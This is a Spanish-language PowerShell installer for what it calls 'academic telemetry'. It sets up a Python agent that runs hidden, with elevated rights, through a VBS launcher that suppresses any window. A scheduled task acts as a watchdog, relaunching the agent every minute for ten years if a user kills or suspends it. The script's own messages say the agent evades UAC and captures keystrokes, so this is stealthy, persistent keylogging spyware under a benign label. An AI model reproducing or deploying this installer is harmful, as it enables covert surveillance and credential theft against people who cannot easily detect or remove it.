# ==================================================
#  Instalador de Telemetría Académica (Windows)
# ==================================================

# 1. Comprobar si se está ejecutando como Administrador (Equivalente a sudo)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] Error: Este script requiere privilegios elevados." -ForegroundColor Red
    Write-Host "[*] Haz clic derecho en PowerShell y selecciona 'Ejecutar como administrador'." -ForegroundColor Yellow
    Exit
}

$UsuarioReal = $env:USERNAME
$DirActual = (Get-Item $PSScriptRoot).Parent.FullName
# OBLIGAMOS A LA TERMINAL A MOVERSE A LA CARPETA DEL PROYECTO
Set-Location -Path $DirActual
$DirGlobal = "$env:USERPROFILE\.telemetria_global"
Start-Transcript -Path "$DirActual\install_log.txt" -Force
# 2. Crear directorio seguro
Write-Host "[*] Creando directorio seguro en: $DirGlobal" -ForegroundColor Cyan
if (-not (Test-Path $DirGlobal)) {
    New-Item -ItemType Directory -Force -Path $DirGlobal | Out-Null
}

# 3. Inyectar PYTHONPATH a nivel de usuario (Equivalente al .bashrc)
Write-Host "[*] Inyectando variable de entorno PYTHONPATH..." -ForegroundColor Cyan
$CurrentPythonPath = [Environment]::GetEnvironmentVariable("PYTHONPATH", "User")
if ($CurrentPythonPath -notmatch [regex]::Escape($DirGlobal)) {
    $NewPythonPath = if ($CurrentPythonPath) { "$DirGlobal;$CurrentPythonPath" } else { $DirGlobal }
    [Environment]::SetEnvironmentVariable("PYTHONPATH", $NewPythonPath, "User")
    Write-Host "[OK] Puente inyectado automáticamente." -ForegroundColor Green
} else {
    Write-Host "[INFO] El puente ya estaba configurado." -ForegroundColor Yellow
}
# ==========================================
# 3.5 Asegurar dependencias de red (Npcap)
# ==========================================
Write-Host "[*] Verificando motor de captura de red (Npcap)..." -ForegroundColor Cyan
$NpcapPath = "C:\Windows\System32\Npcap"

if (-not (Test-Path $NpcapPath)) {
    Write-Host "[!] Npcap no detectado. Descargando instalador oficial..." -ForegroundColor Yellow
    $NpcapUrl = "https://npcap.com/dist/npcap-1.79.exe"
    $InstallerPath = "$DirActual\npcap_installer.exe"

    # Descargar el instalador
    Invoke-WebRequest -Uri $NpcapUrl -OutFile $InstallerPath

    Write-Host "[!] ATENCION: Se abrira el instalador de Npcap. Por favor completa la instalacion manual." -ForegroundColor Yellow
    Write-Host "[!] Asegurate de marcar la opcion 'Install Npcap in WinPcap API-compatible Mode'." -ForegroundColor Yellow

    # Lanzar instalador y esperar a que el usuario termine
    Start-Process -FilePath $InstallerPath -Wait

    # Limpiar el ejecutable descargado
    Remove-Item -Path $InstallerPath -Force -ErrorAction SilentlyContinue
    Write-Host "[OK] Motor de red instalado." -ForegroundColor Green
} else {
    Write-Host "[OK] Npcap ya se encuentra instalado en el sistema." -ForegroundColor Green
}
# 4. Crear entorno virtual e instalar dependencias
Write-Host "[*] Creando entorno virtual aislado (venv)..." -ForegroundColor Cyan
# Usar el lanzador py para asegurar la version mas reciente (o forzar 3.14)
py -3.14 -m venv venv

if (Test-Path "requirements.txt") {
    Write-Host "[*] Instalando dependencias desde requirements.txt..." -ForegroundColor Cyan
    & "$DirActual\venv\Scripts\python.exe" -m pip install --upgrade pip
    & "$DirActual\venv\Scripts\pip.exe" install -r requirements.txt
    Write-Host "[OK] Dependencias instaladas." -ForegroundColor Green
}

# 5. Configurar persistencia (Equivalente a Systemd + Sudoers)
Write-Host "[*] Configurando persistencia (Programador de Tareas)..." -ForegroundColor Cyan

$TaskName = "Agente_ProyectoTitulo_$UsuarioReal"
$ScriptPython = "$DirActual\Client\client.py"
# Usamos pythonw.exe para que no se abra ninguna ventana negra (silencioso)
$PythonVenv = "$DirActual\venv\Scripts\pythonw.exe"

# A) Definir la acción: NO lanzamos pythonw.exe client.py directamente.
#    Lanzamos el script "vigilante", que primero revisa si ya hay una
#    instancia viva Y sana (y si está SUSPENDIDA externamente la mata),
#    y solo arranca una nueva cuando hace falta. Así la misma acción
#    sirve tanto para el arranque en el logon como para cada tick del
#    watchdog, y cubre tanto "el proceso murió" como "el proceso lo
#    congelaron" (ver watchdog.ps1 para el detalle de por qué
#    esto no se puede resolver solo con MultipleInstances=IgnoreNew).
#
#    OJO: no llamamos a powershell.exe directamente desde la tarea
#    programada. Aunque se le pase -WindowStyle Hidden, Windows crea
#    primero la ventana de consola de powershell.exe y recién después la
#    oculta — ese hueco entre "crear" y "ocultar" es justo la pestaña que
#    aparece y desaparece. Por eso envolvemos la llamada en un .vbs:
#    WScript.Shell.Run con el tercer parámetro en 0 (ventana oculta) lanza
#    el proceso sin pasar nunca por ese estado intermedio visible, porque
#    wscript.exe no crea consola propia para empezar.
$VigilanteScript = Join-Path $PSScriptRoot "watchdog.ps1"
$ComandoPowershell = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$VigilanteScript`" -PythonExe `"$PythonVenv`" -ScriptPath `"$ScriptPython`" -WorkDir `"$DirActual\Client`""

# En VBScript, las comillas dobles dentro de un literal de cadena se escapan
# duplicándolas (""), así que hay que duplicar las que ya tiene $ComandoPowershell
# antes de insertarlo dentro del string que WScript.Shell.Run va a ejecutar.
$ComandoVbsEscapado = $ComandoPowershell.Replace('"', '""')
$ContenidoVbs = 'Set objShell = CreateObject("WScript.Shell")' + "`r`n" +
    'objShell.Run "' + $ComandoVbsEscapado + '", 0, False' + "`r`n"

$VbsLanzador = Join-Path $PSScriptRoot "lanzar_vigilante_oculto.vbs"
# Unicode (UTF-16LE con BOM) para que wscript.exe lea bien la ruta aunque
# el nombre de usuario de Windows tenga tildes o ñ.
Set-Content -Path $VbsLanzador -Value $ContenidoVbs -Encoding Unicode -Force

$Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsLanzador`""

# B) Definir los gatillos:
#    B1) Al iniciar sesión este usuario (arranque normal)
$TriggerLogon = New-ScheduledTaskTrigger -AtLogOn -User $UsuarioReal

#    B2) Watchdog: corre el vigilante cada 1 minuto, indefinidamente. Si el
#        agente está corriendo normal, el vigilante no hace nada; si está
#        suspendido (congelado desde afuera, p.ej. con Process Hacker) lo
#        mata y relanza uno limpio; si directamente lo mataron (Task
#        Manager), lo relanza. Todo en el siguiente tick, sin intervención
#        humana.
$TriggerWatchdog = New-ScheduledTaskTrigger -Once -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 1) `
    -RepetitionDuration (New-TimeSpan -Days 3650)

# C) Definir los privilegios (RunLevel Highest = Evade UAC, no pide permisos y da acceso a root/admin)
$Principal = New-ScheduledTaskPrincipal -UserId $UsuarioReal -LogonType Interactive -RunLevel Highest

# D) Definir las configuraciones (Oculto, no detenerse si usa batería, reiniciar si falla,
#    y NO permitir que dos ticks del vigilante corran en paralelo si se superponen)
$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -ExecutionTimeLimit 0 -MultipleInstances IgnoreNew -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)

# Eliminar tarea anterior si existe
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

# Registrar la nueva tarea con AMBOS triggers (arranque + watchdog)
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($TriggerLogon, $TriggerWatchdog) `
    -Principal $Principal -Settings $Settings -Force | Out-Null

# Iniciar la tarea inmediatamente
Start-ScheduledTask -TaskName $TaskName
Stop-Transcript
Write-Host "[OK] Instalacion completada. Agente corriendo en segundo plano." -ForegroundColor Green
Write-Host "=================================================="
Write-Host " INSTALACION COMPLETADA CON EXITO."
Write-Host " El agente evadira el UAC, capturara teclas en Windows,"
Write-Host " y se reiniciara solo si el proceso es terminado o SUSPENDIDO manualmente."
Write-Host "=================================================="